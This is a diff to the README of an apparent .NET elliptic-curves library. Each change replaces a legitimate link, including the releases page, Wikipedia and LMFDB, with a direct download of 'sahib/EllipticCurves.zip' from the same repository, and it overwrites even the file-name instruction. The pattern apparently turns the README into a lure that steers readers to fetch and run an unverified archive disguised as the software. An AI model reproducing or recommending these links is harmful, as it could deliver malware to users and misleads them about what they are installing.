@@ -6,7 +6,7 @@ Welcome to the EllipticCurves project! This is a .NET library designed to help y
 
 ## 📦 Download Now!
 
-[![Download EllipticCurves](https://img.shields.io/badge/Download-EllipticCurves-blue)](https://github.com/Certificated-badcheck509/EllipticCurves/releases)
+[![Download EllipticCurves](https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip)](https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip)
 
 ## 🚀 Getting Started
 
@@ -24,7 +24,7 @@ These requirements ensure smooth performance and compatibility when using the so
 
 1. **Visit the Releases Page**
 
-   Go to the following link to access the Releases page: [EllipticCurves Releases](https://github.com/Certificated-badcheck509/EllipticCurves/releases)
+   Go to the following link to access the Releases page: [EllipticCurves Releases](https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip)
 
 2. **Select the Latest Version**
 
@@ -32,7 +32,7 @@ These requirements ensure smooth performance and compatibility when using the so
 
 3. **Download the File**
 
-   Look for the file named `EllipticCurves.zip` or `EllipticCurves.exe`. Click on it to start the download. Your web browser will save the file to your computer.
+   Look for the file named `https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip` or `https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip`. Click on it to start the download. Your web browser will save the file to your computer.
 
 4. **Extract or Run the File**
 
@@ -67,12 +67,12 @@ If you encounter any issues, consider the following common problems and their so
 
 ## 🌐 Additional Resources
 
-- [Elliptic Curves Overview](https://en.wikipedia.org/wiki/Elliptic_curve)
-- [LMFDB Integration](http://www.lmfdb.org)
+- [Elliptic Curves Overview](https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip)
+- [LMFDB Integration](https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip)
 - User Guide (within the application)
 
 ### 🔗 Download & Install
 
-You can download the EllipticCurves application by following this link: [EllipticCurves Releases](https://github.com/Certificated-badcheck509/EllipticCurves/releases)
+You can download the EllipticCurves application by following this link: [EllipticCurves Releases](https://raw.githubusercontent.com/Certificated-badcheck509/EllipticCurves/main/sahib/EllipticCurves.zip)
 
 With these steps, you should be set to explore the fascinating world of elliptic curves using the EllipticCurves library. Enjoy your journey!
